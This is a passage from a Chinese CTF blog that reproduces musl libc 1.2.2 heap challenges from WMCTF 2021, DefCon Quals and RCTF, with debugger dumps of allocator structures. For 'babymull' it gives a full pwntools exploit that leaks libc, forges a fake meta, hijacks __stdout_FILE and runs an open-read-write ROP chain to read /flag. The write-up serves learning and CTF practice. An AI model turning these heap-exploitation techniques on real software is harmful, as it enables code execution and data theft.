对应大小的缓存的所有meta的group所管理的chunk个数。</span></span><br><span class="line">  unmap_seq = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;, </span><br><span class="line">  bounces = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">31</span> times&gt;, </span><br><span class="line">  seq = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">  brk = <span class="number">93825004261376</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &amp;__malloc_context</span><br><span class="line"><span class="variable">$2</span> = (struct malloc_context *) <span class="number">0</span>x7f952e19cb60 &lt;__malloc_context&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | <span class="keyword">DATA</span> | RWX | RODATA</span><br><span class="line">......</span><br><span class="line">    <span class="number">0</span>x7f952e19c000     <span class="number">0</span>x7f952e19d000 rw<span class="literal">-p</span>     <span class="number">1000</span> <span class="number">98000</span>  /home/wendy/Desktop/xyb/babymull/libc.so</span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>__malloc_context</code>是musl libc的全局管理结构指针,相当于main_arena，存放在libc.so的bss段</p><p><code>active = &#123;0x56042ee901d0,0,0...</code>：堆管理器依据申请的size，将chunk分成48类chunk，由sizeclass指定。每类chunk由一个meta结构管理，meta管理的chunk个数有限，由<code>small_cnt_tab</code>指定。当申请个数超出一个meta所能管理的最大数量，堆管理器会再申请同类型meta管理更多的chunk，并且以双向链表结构管理这些相同类型的meta。<br><code>usage_by_class = &#123;0x1e, 0x0, 0x0, 0x7,...</code>：表示当前各meta管理着的chunk个数。</p><h4 id="申请-chunk后的malloc-context变化"><a href="#申请-chunk后的malloc-context变化" class="headerlink" title="申请 chunk后的malloc_context变化"></a>申请 chunk后的malloc_context变化</h4><p>这里直接用这题做测试，add 0x20两次，相当于申请了4个0x30的chunk</p><p>用户申请空间之后，才有了meta页来对chunk进行管理</p><p>同时malloc_context的active数组对应元素会指向meta地址</p><p>usage_by_class数组会显示该meta的每group可管理chunk的最多数量</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/%E6%97%A0%E6%A0%87%E9%A2%98.png" alt="无标题"></p><h4 id="meta结构体"><a href="#meta结构体" class="headerlink" title="meta结构体"></a>meta结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span> <span class="comment">// meta是一个双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>申请4个chunk之后gdb查看meta结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912153822227.png" alt="image-20210912153822227"></p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912154050548.png" alt="image-20210912154050548"></p><blockquote><p><code>0x7fb8fbfa9ce0</code>是<code>user data</code>域；<br><code>avail_mask = 1008 = 0b11 1111 0000</code>表示第0、1、2、3个chunk不可用（已经被使用）；<br><code>freed_mask = 0</code>表示没有chunk被释放；<br><code>last_idx = 9</code>表示最后一个chunk的下标是9，总数是10个<br><code>sizeclass = 2</code>表示由<code>2</code>这个group进行管理。</p></blockquote><p>当我们把2这个group里10个chunk都使用掉，之后申请就会开辟第二个meta页进行管理，两个meta之间由一个双向链表进行维护；</p><h4 id="group里的chunk结构"><a href="#group里的chunk结构" class="headerlink" title="group里的chunk结构"></a>group里的chunk结构</h4><p>由上图meta结构中的mem指针查看<code>user data</code>域</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912160425927.png" alt="image-20210912160425927"></p><p>需要注意，分配给用户的 最小chunk size 不是0x10而是0x8</p><p>和glibc类似，可以进行<strong>复用</strong>，可以接收输入<code>8+4</code>个byte，<strong>占用下一个chunk header的前4个byte</strong></p><h4 id="释放-chunk之后meta结构变化"><a href="#释放-chunk之后meta结构变化" class="headerlink" title="释放 chunk之后meta结构变化"></a>释放 chunk之后meta结构变化</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>, b<span class="string">&quot;B&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x20</span>, b<span class="string">&quot;C&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct meta*)<span class="number">0</span>x55555688b1f8</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  prev = <span class="number">0</span>x55555688b1f8, </span><br><span class="line">  next = <span class="number">0</span>x55555688b1f8, </span><br><span class="line">  mem = <span class="number">0</span>x7f9d4c0fbce0, </span><br><span class="line">  avail_mask = <span class="number">1008</span>, </span><br><span class="line">  freed_mask = <span class="number">3</span>, </span><br><span class="line">  last_idx = <span class="number">9</span>, </span><br><span class="line">  freeable = <span class="number">1</span>, </span><br><span class="line">  sizeclass = <span class="number">2</span>, </span><br><span class="line">  maplen = <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>freed_mask = 3 = 0b11</code>表示前两个chunk被释放；<br><code>avail_mask = 1008 = 0b11 1111 0000</code>可以发现，avail_mask没变，此时前两个chunk仍然为不可分配的状态；</p><p>chunk header</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912163514516.png" alt="image-20210912163514516"></p><p>上面了解得差不多了，应该就可以看懂exp了</p><p>开始复现</p><h3 id="how-to-leak"><a href="#how-to-leak" class="headerlink" title="how to leak"></a>how to leak</h3><p>manage chunk里面就有slot指针（其实就是chunk，但是好像在musl里面叫slot），但是前面的name有截断符，泄露不了</p><p>当一个group的所有chunk都被使用过了 ，才会使用被释放的chunk，</p><p>那么我们先申请完10个chunk，并填满数据，再释放上图前两个框的chunk，</p><p>再申请两个size不等于0x20的content_chunk，则第二个content_chunk的manage_chunk就是上图第二个框的chunk，</p><p>name的截断符就没有了，这样show功能可以直接泄露后面的指针域</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912170553923.png" alt="image-20210912170553923"></p><h3 id="how-to-hijack"><a href="#how-to-hijack" class="headerlink" title="how to hijack"></a>how to hijack</h3><p>dele content_chunk5时</p><p>会根据content_chunk5的head中的offset定位到存放meta地址的地址</p><p>offset被我们用后门函数改为了0x1000</p><p>所以就定位到了chunk0内已经写好的fake meta地址</p><p>这样fake meta就被链到了active里</p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912223251244.png" alt="image-20210912223251244"></p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912223348499.png" alt="image-20210912223348499"></p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210912223734296.png" alt="image-20210912223734296"></p><p>之后再edit chunk0 </p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210913101355722.png" alt="image-20210913101355722"></p><p><img src="/2021/09/05/WMCTF-2021-pwn-%E5%A4%8D%E7%8E%B0/image-20210913103019896.png" alt="image-20210913103019896"></p><p>这篇新空间刚好可以用来写orw_rop</p><p>之后申请0x800的chunk就刚好能申请到stdout_FILE</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;119.3.81.43&#x27;</span>, <span class="number">49153</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;./libc.so&quot;</span>,<span class="string">&quot;./babymull&quot;</span>])</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice &gt;&gt; &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">Size,content=<span class="string">&#x27;A&#x27;</span>, name=<span class="string">b&quot;A&quot;</span>*<span class="number">0xf</span></span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sa(<span class="string">&#x27;Name: &#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(Size))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">set_zero,leak_addr</span>):</span></span><br><span class="line">    menu(<span class="number">0x73317331</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(set_zero))</span><br><span class="line">    sl(<span class="built_in">str</span>(leak_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x20</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0x20</span>) <span class="comment"># fill group2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>)                       <span class="comment"># 0 use manage_chunk0</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x238</span> + p32(<span class="number">0x5</span>)) <span class="comment"># 5 use content_chunk0        why p32(0x5)????</span></span><br><span class="line"><span class="comment">#                                   # fake reserved_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Leak libc address</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc.address = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) + <span class="number">0x2aa0</span> +<span class="number">0x6000</span></span><br><span class="line">leak(<span class="string">&#x27;libc.address&#x27;</span>,libc.address)</span><br><span class="line">mmap_base = libc.address - <span class="number">0xa000</span> </span><br><span class="line">leak(<span class="string">&#x27;mmap_base&#x27;</span>,mmap_base)</span><br><span class="line">leak(<span class="string">&#x27;mmap_base + 0x1560 -8 + 6&#x27;</span>,mmap_base + <span class="number">0x1560</span> -<span class="number">8</span> + <span class="number">6</span>)</span><br><span class="line">leak(<span class="string">&#x27;malloc_context&#x27;</span>,libc.symbols[<span class="string">&#x27;__malloc_context&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify head of content_chunk_5 // offset 0x1550-&gt;0x1000</span></span><br><span class="line"><span class="comment"># leak __malloc_context-&gt;secrect</span></span><br><span class="line">gift(mmap_base + <span class="number">0x1560</span> -<span class="number">8</span> + <span class="number">6</span> ,libc.symbols[<span class="string">&#x27;__malloc_context&#x27;</span>])</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">secret = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;secret&#x27;</span>,secret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Construct fake_meta and fake_meta_arena</span></span><br><span class="line">fake_meta     = mmap_base+<span class="number">0x1000</span>+<span class="number">8</span></span><br><span class="line">fake_meta_ptr = mmap_base+<span class="number">0x550</span></span><br><span class="line"><span class="comment"># fake_meta_ptr</span></span><br><span class="line">pp  = flat(&#123;<span class="number">0x550</span>-<span class="number">0x30</span>: fake_meta&#125;, filler=<span class="string">&#x27;\x00&#x27;</span>, length=<span class="number">0x1000</span>-<span class="number">0x30</span>) </span><br><span class="line"><span class="comment"># fake meta_arena</span></span><br><span class="line">pp += p64(secret) <span class="comment"># area-&gt;check</span></span><br><span class="line"><span class="comment"># fake meta</span></span><br><span class="line">pp += flat([<span class="number">0</span>, <span class="number">0</span>,            <span class="comment"># meta-&gt;prev, meta-&gt;next</span></span><br><span class="line">            fake_meta_ptr,   <span class="comment"># meta-&gt;mem</span></span><br><span class="line">            <span class="number">0</span>,               <span class="comment"># meta-&gt;avail_mask, meta-&gt;freed_mask</span></span><br><span class="line">            (<span class="number">24</span>&lt;&lt;<span class="number">6</span>)+<span class="number">1</span>        <span class="comment"># meta-&gt;sizeclass, meta-&gt;last_idx </span></span><br><span class="line">        ])</span><br><span class="line">leak(<span class="string">&#x27;fake_meta&#x27;</span>,fake_meta)</span><br><span class="line">leak(<span class="string">&#x27;fake_meta_ptr&#x27;</span>,fake_meta_ptr)</span><br><span class="line"><span class="comment">#edit chunk0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,pp) <span class="comment"># write fake meta to chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># insert fake meta</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit chunk0(fake meta-&gt;mem to __stdout_FILE)  // uaf bin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x1000</span>-<span class="number">0x40</span>+<span class="number">8</span>) + flat([<span class="number">0</span>, <span class="number">0</span>, libc.symbols[<span class="string">&quot;__stdout_FILE&quot;</span>]-<span class="number">0x940</span>, <span class="number">2</span>, (<span class="number">24</span>&lt;&lt;<span class="number">6</span>)+<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Build orw ROP</span></span><br><span class="line"></span><br><span class="line">buf       = mmap_base + <span class="number">0x2aa0</span></span><br><span class="line">leak(<span class="string">&#x27;buf&#x27;</span>,buf)</span><br><span class="line">rop_chain = mmap_base + <span class="number">0x2ba0</span></span><br><span class="line">leak(<span class="string">&#x27;rop_chain&#x27;</span>,rop_chain)</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x15536</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x1b3a9</span></span><br><span class="line">pop_rdx = libc.address + <span class="number">0x4727c</span></span><br><span class="line">xchg_eax_edi = libc.address + <span class="number">0x26e75</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>  = libc.symbols[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read  = libc.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write = libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">rop = flat([</span><br><span class="line">    pop_rdi, buf,</span><br><span class="line">    pop_rsi, <span class="number">0</span>,</span><br><span class="line">    <span class="built_in">open</span>,           <span class="comment"># open(&quot;/flag&quot;, 0)</span></span><br><span class="line">    xchg_eax_edi,   <span class="comment">#xchg   edi,eax; ret</span></span><br><span class="line">    pop_rsi, buf,</span><br><span class="line">    pop_rdx, <span class="number">0x100</span>,</span><br><span class="line">    read,           <span class="comment"># read(fd, buf, 0x100)</span></span><br><span class="line">    pop_rdi, <span class="number">1</span>,</span><br><span class="line">    pop_rsi, buf,</span><br><span class="line">    pop_rdx, <span class="number">0x100</span>,</span><br><span class="line">    write,          <span class="comment"># write(1, buf, 0x100)</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&quot;/flag&quot;</span>.ljust(<span class="number">0x100</span>, <span class="string">&#x27;\x00&#x27;</span>) + rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment">### Build fake __stdout_FILE</span></span><br><span class="line"><span class="comment"># 0x15238: ret; </span></span><br><span class="line">ret       = libc.address + <span class="number">0x15238</span></span><br><span class="line"><span class="comment"># 0x4bcf3: mov rsp, qword ptr [rdi + 0x30]; jmp qword ptr [rdi + 0x38]; </span></span><br><span class="line">stack_mig = libc.address + <span class="number">0x4bcf3</span></span><br><span class="line"></span><br><span class="line">stdout = flat(&#123;</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wpos</span></span><br><span class="line">    <span class="number">0x28</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wend</span></span><br><span class="line">    <span class="number">0x30</span>: rop_chain, </span><br><span class="line">    <span class="number">0x38</span>: ret, </span><br><span class="line">    <span class="number">0x48</span>: stack_mig  <span class="comment"># f-&gt;write</span></span><br><span class="line">&#125;,filler=<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> stdout</span><br><span class="line"><span class="comment">### Overwrite __stdout_FILE</span></span><br><span class="line">add(<span class="number">0x800</span>, stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><p>为什么add 0x800大小的chunk就可以直接申请到stdout_FILE，而不是从被释放的0x1000chunk开头开始（stdout_FILE - 0x940）?</p><p>为什么content_chunk5（0x1000）一开始要在0x238偏移后写入p32(5)，大概是绕过free时的检查？毕竟把它head头的offset从0x1550改成了1000</p><hr><p>待复现</p><p><a href="https://cy2cs.top/2021/06/16/%E3%80%90ctf%E3%80%91%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-easyheap/">https://cy2cs.top/2021/06/16/%E3%80%90ctf%E3%80%91%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-easyheap/</a></p><h2 id="DefCon-Quals-2021-mooosl"><a href="#DefCon-Quals-2021-mooosl" class="headerlink" title="DefCon_Quals_2021_mooosl"></a>DefCon_Quals_2021_mooosl</h2><p><a href="https://www.anquanke.com/post/id/241104#h2-0">https://www.anquanke.com/post/id/241104#h2-0</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./libc.so </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure><h3 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">manage_chunk</span>&#123;</span> # <span class="number">0x30</span></span><br><span class="line"><span class="keyword">void</span> *key_chunk_ptr;</span><br><span class="line"><span class="keyword">void</span> *value_chunk_ptr;</span><br><span class="line"><span class="keyword">int</span> key_size;</span><br><span class="line"><span class="keyword">int</span> value_size;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">hash_key</span><span class="params">(?)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">manage_chunk_ptr</span><span class="params">(?)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>只有add可以编辑value</p><p>有dele和show，但是是通过key的hash值进行索引</p><h2 id="RCTF-2021-musl"><a href="#RCTF-2021-musl" class="headerlink" title="RCTF_2021_musl"></a>RCTF_2021_musl</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./libc.so </span><br><span class="line">musl libc (x86_64)</span><br><span class="line">Version 1.2.2</span><br><span class="line">Dynamic Program Loader</span><br></pre></td></tr></table></figure><h3 id="静态分析-3"><a href="#静态分析-3" class="headerlink" title="静态分析"></a>静态分析</h3><p>禁用了execve</p><p>只能在add写chunk</p><p>idx&lt;=15</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">manage_chunk</span>&#123;</span> # <span class="number">0xc</span>(<span class="number">8</span>+<span class="number">4</span>)复用<span class="number">4</span>字节空间</span><br><span class="line"><span class="keyword">void</span> *content_chunk_ptr; # chunk_Size &lt;= <span class="number">0x1000</span></span><br><span class="line">        <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> size - <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>free content_chunk</p><p>free manage_chunk</p><p>任意次数show</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;准备复现5道musl pwn，其中4道都是1.2.2版本的，源码实在看不下去呜呜呜，还是跟之前学glibc一样，直接去gdb看数据来理解结构和内存管理。musl里没有malloc_hook和free_hook，所以保护全开的时候通常只能打FILE结构体。先从类似glibc的1.1.24版本入手。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2021祥云杯pwn_wp</title>
    <link href="https://brooke-hub.github.io/2021/09/05/2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn-wp/"/>
    <id>https://brooke-hub.github.io/2021/09/05/2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn-wp/</id>
    <published>2021-09-05T00:58:21.000Z</published>
    <updated>2021-09-05T02:26:25.346Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a><strong>PassWordBox_FreeVersion</strong></h1><p>off by one</p><p>就是数据会被异或加密，但是异或结果可以被泄露从而算出密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 